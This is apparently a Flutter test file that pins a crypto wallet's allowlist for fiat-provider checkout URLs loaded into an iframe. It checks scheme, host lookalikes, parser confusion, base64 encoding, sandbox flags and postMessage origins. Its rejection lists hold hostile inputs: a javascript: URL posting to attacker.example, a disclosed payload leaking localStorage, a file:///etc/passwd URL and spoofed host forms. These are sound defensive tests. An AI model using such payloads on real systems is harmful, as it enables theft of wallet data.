import 'dart:convert';
import 'dart:io';

import 'package:flutter_test/flutter_test.dart';
import 'package:web_dex/bloc/fiat/base_fiat_provider.dart';
import 'package:web_dex/bloc/fiat/fiat_checkout_url_allowlist.dart';

/// `assets/web_pages/fiat_widget.html` turns a base64 query parameter into an
/// iframe `src` inside the wallet's own origin. These tests pin the check that
/// stands between that parameter and the iframe, on both sides: the Dart
/// caller, and the deployed HTML asset that already-shipped desktop and mobile
/// builds fetch straight from production.
const String _widgetAssetPath = 'assets/web_pages/fiat_widget.html';

void main() {
  group('Fiat checkout URL allowlist:', () {
    test('accepts the known provider checkout hosts', () {
      for (final host in kFiatCheckoutAllowedHosts) {
        expect(
          isAllowedFiatCheckoutUrl('https://$host/checkout?orderId=abc'),
          isTrue,
          reason: '$host should be an approved checkout host',
        );
      }
    });

    test('accepts sub-domains of the provider domains', () {
      expect(isAllowedFiatCheckoutUrl('https://gleec.banxa.com/'), isTrue);
      expect(isAllowedFiatCheckoutUrl('https://banxa.com/'), isTrue);
      expect(isAllowedFiatCheckoutUrl('https://a.b.ramp.network/'), isTrue);
    });

    test('rejects every non-https scheme', () {
      const hostile = <String>[
        'javascript:fetch("https://attacker.example",{method:"POST"})',
        // The exact payload shape from the disclosure.
        "javascript:parent.postMessage(JSON.stringify(localStorage),'*')",
        'data:text/html,<script>alert(1)</script>',
        'blob:https://komodo.banxa.com/1234',
        'file:///etc/passwd',
        'http://komodo.banxa.com/',
        'vbscript:msgbox(1)',
      ];

      for (final url in hostile) {
        expect(
          isAllowedFiatCheckoutUrl(url),
          isFalse,
          reason: '$url must not reach the iframe',
        );
      }
    });

    test('rejects hosts that only look like a provider', () {
      const lookalikes = <String>[
        'https://attacker.example/',
        // Suffix matching without the leading dot would accept this.
        'https://evilbanxa.com/',
        'https://notramp.network/',
        // The provider name as a sub-domain of someone else's domain.
        'https://komodo.banxa.com.attacker.example/',
        'https://banxa.com.attacker.example/',
        // Credentials make the real host the part after the `@`.
        'https://komodo.banxa.com@attacker.example/',
        'https://komodo.banxa.com:pass@attacker.example/',
      ];

      for (final url in lookalikes) {
        expect(
          isAllowedFiatCheckoutUrl(url),
          isFalse,
          reason: '$url must not reach the iframe',
        );
      }
    });

    test('rejects URLs that two parsers would read differently', () {
      // Dart treats the backslash as part of the userinfo; a browser treats it
      // as a path separator, so the two disagree about which host this is.
      expect(
        isAllowedFiatCheckoutUrl(r'https://attacker.example\@komodo.banxa.com/'),
        isFalse,
      );
      // Browsers strip tabs and newlines before parsing; Dart does not.
      expect(
        isAllowedFiatCheckoutUrl('https://attacker.example\t/'),
        isFalse,
      );
      expect(
        isAllowedFiatCheckoutUrl('https://komodo.banxa\n.com/'),
        isFalse,
      );
    });

    test('rejects empty, relative and unparseable values', () {
      expect(isAllowedFiatCheckoutUrl(null), isFalse);
      expect(isAllowedFiatCheckoutUrl(''), isFalse);
      expect(isAllowedFiatCheckoutUrl('//komodo.banxa.com/'), isFalse);
      expect(isAllowedFiatCheckoutUrl('/checkout'), isFalse);
      expect(isAllowedFiatCheckoutUrl('komodo.banxa.com'), isFalse);
      expect(isAllowedFiatCheckoutUrl('https:/komodo.banxa.com'), isFalse);
    });

    test('normalises case and the fully-qualified trailing dot', () {
      expect(isAllowedFiatCheckoutUrl('https://KOMODO.BANXA.COM/'), isTrue);
      expect(isAllowedFiatCheckoutHost('komodo.banxa.com.'), isTrue);
      expect(isAllowedFiatCheckoutHost(''), isFalse);
    });
  });

  group('fiatWrapperPageUrl:', () {
    const providerUrl = 'https://komodo.banxa.com/?orderId=abc&id=a+b/c';

    test('refuses to wrap a URL that is not an approved provider', () {
      expect(
        () => BaseFiatProvider.fiatWrapperPageUrl('javascript:alert(1)'),
        throwsArgumentError,
      );
      expect(
        () => BaseFiatProvider.fiatWrapperPageUrl('https://attacker.example/'),
        throwsArgumentError,
      );
    });

    test('encodes the provider URL so the wrapper can decode it again', () {
      final wrapped = BaseFiatProvider.fiatWrapperPageUrl(providerUrl);
      final param = Uri.parse(wrapped).queryParameters['fiatUrl'];

      expect(param, isNotNull);
      // A `+` in the query string is decoded as a space by the wrapper page's
      // URLSearchParams, so standard base64 must not be used here.
      expect(param, isNot(contains('+')));
      expect(
        utf8.decode(base64Url.decode(param!)),
        providerUrl,
        reason: 'the wrapper page must recover the exact provider URL',
      );
    });
  });

  group('fiat_widget.html:', () {
    late String widgetSource;

    setUpAll(() {
      final file = File(_widgetAssetPath);
      expect(
        file.existsSync(),
        isTrue,
        reason: 'run this suite from the repository root',
      );
      widgetSource = file.readAsStringSync();
    });

    test('carries the same allowlists as the Dart source', () {
      expect(
        _jsStringArray(widgetSource, 'KOMODO_ALLOWED_CHECKOUT_HOSTS'),
        kFiatCheckoutAllowedHosts,
        reason: 'the deployed asset defends already-shipped clients on its '
            'own, so its host list has to match this one exactly',
      );
      expect(
        _jsStringArray(widgetSource, 'KOMODO_ALLOWED_CHECKOUT_DOMAINS'),
        kFiatCheckoutAllowedDomains,
      );
    });

    test('validates the decoded URL before it becomes an iframe src', () {
      // Guards against the check being edited out of the shipped asset, which
      // Dart-side tests would otherwise never notice.
      expect(widgetSource, contains("parsed.protocol !== 'https:'"));
      expect(widgetSource, contains('_komodoIsAllowedCheckoutHost'));
      expect(widgetSource, contains('parsed.username || parsed.password'));
      // The validated, re-serialised URL is what gets loaded.
      expect(
        widgetSource,
        contains("document.getElementById('fiat-onramp-iframe').src = approvedUrl;"),
      );
      // No base argument: a relative URL must fail rather than resolve against
      // the wallet's own origin.
      expect(widgetSource, contains('parsed = new URL(rawUrl);'));
    });

    test('does not let the framed page navigate the top window on its own', () {
      final sandbox = RegExp('sandbox="([^"]*)"').firstMatch(widgetSource);
      expect(sandbox, isNotNull);

      final tokens = sandbox!.group(1)!.split(RegExp(r'\s+'));
      expect(tokens, isNot(contains('allow-top-navigation')));
      // `-by-user-action` is not a sandbox flag; browsers reject the whole
      // token and silently drop it. The spelling below is the one that works.
      expect(tokens, contains('allow-top-navigation-by-user-activation'));
    });

    test('does not broadcast provider messages with a wildcard origin', () {
      expect(widgetSource, isNot(contains('postMessage(messageString, "*")')));
      expect(widgetSource, contains('_komodoIsAllowedMessageOrigin'));
    });
  });
}

/// Reads a `var <name> = ['a', 'b'];` array out of the widget's inline script.
List<String> _jsStringArray(String source, String name) {
  final declaration = RegExp('var $name = \\[([^\\]]*)\\];').firstMatch(source);
  expect(declaration, isNotNull, reason: 'missing $name in $_widgetAssetPath');

  return RegExp("'([^']*)'")
      .allMatches(declaration!.group(1)!)
      .map((match) => match.group(1)!)
      .toList();
}
